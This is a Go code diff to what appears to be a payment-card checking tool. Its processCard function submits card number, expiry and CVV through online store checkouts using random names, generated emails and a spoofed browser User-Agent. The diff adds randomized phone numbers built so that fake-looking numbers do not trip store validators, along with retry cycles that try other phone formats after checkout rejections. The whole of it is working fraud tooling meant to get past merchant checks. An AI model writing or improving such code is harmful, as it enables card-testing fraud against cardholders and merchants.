@@ -67,6 +67,41 @@ var dialCodes = map[string]string{
 	"BR": "55",
 }
 
+// randomizedPhones builds per-check phone renderings from the Book entry:
+// same country dial + digit count, randomized subscriber digits (first 2-9)
+// so fake-obvious numbers (55555555, 9876543210) don't trip validators.
+// Returns (e164, local, raw). Empty e164 = fall back to Book normalize.
+func randomizedPhones(addr Address) (string, string, string) {
+	dial, ok := dialCodes[addr.CountryCode]
+	if !ok || dial == "" {
+		return "", "", ""
+	}
+	bookDigits := ""
+	for _, r := range addr.Phone {
+		if r >= '0' && r <= '9' {
+			bookDigits += string(r)
+		}
+	}
+	n := len(bookDigits) - len(dial)
+	if strings.HasPrefix(bookDigits, dial) && n > 0 {
+		// strip dial if embedded
+	} else {
+		n = len(bookDigits)
+	}
+	if n <= 0 {
+		return "", "", ""
+	}
+	gen := ""
+	for i := 0; i < n; i++ {
+		d := rand.Intn(10)
+		if i == 0 && d < 2 {
+			d = 2 + rand.Intn(8)
+		}
+		gen += string(rune('0' + d))
+	}
+	return "+" + dial + gen, gen, "+" + dial + " " + gen
+}
+
 // normalizePhone converts Book phones to E.164 ("+<dial><digits>").
 func normalizePhone(raw, countryCode string) string {
 	digits := ""
@@ -1091,6 +1126,59 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	fName, lName := getRandName()
 	email := genEmail(fName, lName)
 	phone := normalizePhone(addr.Phone, addr.CountryCode)
+	// Per-check randomized national number: static Book phones (55555555,
+	// 9876543210, …) trip repeated/sequential-digit validators. Keep the
+	// country dial code + digit count, randomize the rest (first digit 2-9).
+	phoneE164, phoneLocal, phoneRaw := randomizedPhones(addr)
+	// Dial + national length remembered so every PHONE remedy retries with
+	// FRESH random digits (a bad draw like wrong leading digit must not
+	// poison all format attempts).
+	phoneDial, phoneNatLen := "", 0
+	if _d, _ok := dialCodes[addr.CountryCode]; _ok {
+		phoneDial = _d
+		_bd := ""
+		for _, _r := range addr.Phone {
+			if _r >= '0' && _r <= '9' {
+				_bd += string(_r)
+			}
+		}
+		if strings.HasPrefix(_bd, _d) && len(_bd) > len(_d) {
+			phoneNatLen = len(_bd) - len(_d)
+		} else {
+			phoneNatLen = len(_bd)
+		}
+	}
+	regenPhones := func() {
+		if phoneDial == "" || phoneNatLen <= 0 {
+			return
+		}
+		_gen := ""
+		for _i := 0; _i < phoneNatLen; _i++ {
+			_dg := rand.Intn(10)
+			if _i == 0 && _dg < 2 {
+				_dg = 2 + rand.Intn(8)
+			}
+			_gen += string(rune('0' + _dg))
+		}
+		phoneE164 = "+" + phoneDial + _gen
+		phoneLocal = _gen
+		phoneRaw = "+" + phoneDial + " " + _gen
+	}
+	if phoneE164 == "" {
+		phoneE164 = phone
+		phoneRaw = strings.TrimSpace(addr.Phone)
+		_phoneDigits := ""
+		for _, _r := range phoneE164 {
+			if _r >= '0' && _r <= '9' {
+				_phoneDigits += string(_r)
+			}
+		}
+		phoneLocal = _phoneDigits
+		if _d, _ok := dialCodes[addr.CountryCode]; _ok && strings.HasPrefix(_phoneDigits, _d) && len(_phoneDigits) > len(_d) {
+			phoneLocal = _phoneDigits[len(_d):]
+		}
+	}
+	// Alternate renderings (e164 → omit → local → raw) cycled by PHONE remedy.
 
 	headers := map[string]string{
 		"User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
@@ -1264,7 +1352,7 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		"streetAddress": map[string]string{
 			"address1": addr.Address1, "city": addr.City, "countryCode": addr.CountryCode,
 			"postalCode": addr.PostalCode, "firstName": fName, "lastName": lName,
-			"zoneCode": addr.ZoneCode, "phone": phone,
+			"zoneCode": addr.ZoneCode, "phone": phoneE164,
 			// DELIVERY_COMPANY_REQUIRED stores reject company-less
 			// addresses; residential pattern (name as company) is neutral.
 			"company": fName + " " + lName,
@@ -1794,7 +1882,7 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 						"handle":             deliveryStrategy,
 						"customDeliveryRate": false,
 					},
-					"options": map[string]string{"phone": phone},
+					"options": map[string]string{"phone": phoneE164},
 				},
 				"targetMerchandiseLines": map[string]interface{}{
 					"lines": []map[string]string{{"stableId": stableID}},
@@ -1867,8 +1955,46 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	log.Printf("[DBG submit] cc=%s base=%s bodylen=%d fstr=%q sfc=%v submitType=%q taxesInclBody=%q", maskCard(cc+"|"+mes+"|"+ano+"|"+cvv), baseURL, len(body), fstr(body, "__typename"), fastExtract(body, "submitForCompletion") != nil, submitType, fstr(body, "taxesIncluded"))
 
 	_taxShape := "proposed"
-	_noPhone := false
+	// Phone rendering cycle: e164 (initial submit) → omit → local →
+	// raw. Strict per-country validators accept exactly one of these;
+	// PHONE codes advance the cycle, REQUIRED restores a present shape.
+	_phoneModes := []string{"omit", "local", "raw", "e164"}
+	_phoneIdx := 0
+	_phoneMode := "e164"
+	applyPhone := func(mode string) {
+		_phoneMode = mode
+		var _p string
+		switch mode {
+		case "omit":
+			_p = ""
+		case "local":
+			_p = phoneLocal
+		case "raw":
+			_p = phoneRaw
+		default:
+			_p = phoneE164
+		}
+		if _sa, _ok := billingAddr["streetAddress"].(map[string]string); _ok {
+			if _p == "" {
+				delete(_sa, "phone")
+			} else {
+				_sa["phone"] = _p
+			}
+		}
+		if _inMap, _ok := submitVars["input"].(map[string]interface{}); _ok {
+			if _dl, _ok := _inMap["delivery"].(map[string]interface{}); _ok {
+				if _lines, _ok := _dl["deliveryLines"].([]map[string]interface{}); _ok && len(_lines) > 0 {
+					if _opt, _ok := _lines[0]["selectedDeliveryStrategy"].(map[string]interface{}); _ok {
+						if _o, _ok := _opt["options"].(map[string]string); _ok {
+							_o["phone"] = _p
+						}
+					}
+				}
+			}
+		}
+	}
 	_prevSig, _prevPrevSig := "", ""
+	_sigHist := []string{}
 	for _rejTry, _topErr := 0, ""; _rejTry < 8 && submitType == "SubmitRejected"; _rejTry++ {
 		errCodes := []string{}
 		errs := fastExtract(body, "errors")
@@ -1887,12 +2013,22 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 				}
 			}
 		}
-		// Stuck detection: same non-waiting codes 3x in a row with no
-		// remedy progress → terminal, stop burning time. WAITING is exempt
-		// (its remedy is elapsed time); cap 8 bounds the worst case.
+		// Stuck detection: same non-waiting codes 3x in a row, or only 2
+		// distinct codes across the last 4 rounds (A,B,A,B flap) → terminal.
+		// WAITING is exempt (its remedy is elapsed time); cap 8 bounds all.
 		_sig := strings.Join(errCodes, "|")
 		if _rejTry >= 2 && _sig == _prevSig && _sig == _prevPrevSig && !strings.Contains(_sig, "WAITING_PENDING_TERMS") {
 			break
+		}
+		_sigHist = append(_sigHist, _sig)
+		if _rejTry >= 5 && !strings.Contains(_sig, "WAITING_PENDING_TERMS") {
+			_seen := map[string]bool{}
+			for _, _s := range _sigHist[maxInt(0, len(_sigHist)-4):] {
+				_seen[_s] = true
+			}
+			if len(_seen) <= 2 {
+				break
+			}
 		}
 		_prevPrevSig, _prevSig = _prevSig, _sig
 		// Delivery-strategy rejected: cycle the seller's remaining handles.
@@ -1911,35 +2047,25 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 				break
 			}
 		}
-		// Phone pattern rejected → retry phoneless. Phone REQUIRED while
-		// phoneless → restore E.164 phone (flip-flop, one round-trip max:
-		// stuck-break ends it if the store keeps flapping).
+		// Phone rejected: REQUIRED restores a present shape; any other
+		// PHONE pattern advances the rendering cycle (omit → local →
+		// raw → e164). Stuck-break bounds stores that reject everything.
 		for _, _c := range errCodes {
-			if strings.Contains(_c, "PHONE_NUMBER") && !_noPhone {
-				_noPhone = true
-				if _sa, ok := billingAddr["streetAddress"].(map[string]string); ok {
-					delete(_sa, "phone")
-				}
-				if _inMap, ok := submitVars["input"].(map[string]interface{}); ok {
-					if _dl, ok := _inMap["delivery"].(map[string]interface{}); ok {
-						if _lines, ok := _dl["deliveryLines"].([]map[string]interface{}); ok && len(_lines) > 0 {
-							if _opt, ok := _lines[0]["selectedDeliveryStrategy"].(map[string]interface{}); ok {
-								if _o, ok := _opt["options"].(map[string]string); ok {
-									_o["phone"] = ""
-								}
-							}
-						}
-					}
+			if !strings.Contains(_c, "PHONE_NUMBER") {
+				continue
+			}
+			// Fresh digits every remedy: a bad draw (wrong leading digit
+			// for the country) must not poison all format attempts.
+			regenPhones()
+			if strings.Contains(_c, "REQUIRED") {
+				if _phoneMode != "e164" {
+					applyPhone("e164")
 				}
 				break
 			}
-			if strings.Contains(_c, "REQUIRED") && strings.Contains(_c, "PHONE") && _noPhone {
-				_noPhone = false
-				if _sa, ok := billingAddr["streetAddress"].(map[string]string); ok {
-					_sa["phone"] = phone
-				}
-				break
-			}
+			applyPhone(_phoneModes[_phoneIdx%len(_phoneModes)])
+			_phoneIdx++
+			break
 		}
 		for _, _c := range errCodes {
 			if (strings.Contains(_c, "PRESENTMENT_CURRENCY") || strings.Contains(_c, "CURRENCY_NOT_SUPPORTED")) && sellerCurrency != "" && sellerCurrency != currency {
@@ -1977,9 +2103,14 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 			dl := submitVars["input"].(map[string]interface{})["delivery"].(map[string]interface{})
 			if lines, ok := dl["deliveryLines"].([]map[string]interface{}); ok && len(lines) > 0 {
 				if deliveryStrategy != "" {
-					_optPhone := phone
-					if _noPhone {
+					_optPhone := phoneE164
+					switch _phoneMode {
+					case "omit":
 						_optPhone = ""
+					case "local":
+						_optPhone = phoneLocal
+					case "raw":
+						_optPhone = phoneRaw
 					}
 					lines[0]["selectedDeliveryStrategy"] = map[string]interface{}{
 						"deliveryStrategyByHandle": map[string]interface{}{"handle": deliveryStrategy, "customDeliveryRate": false},
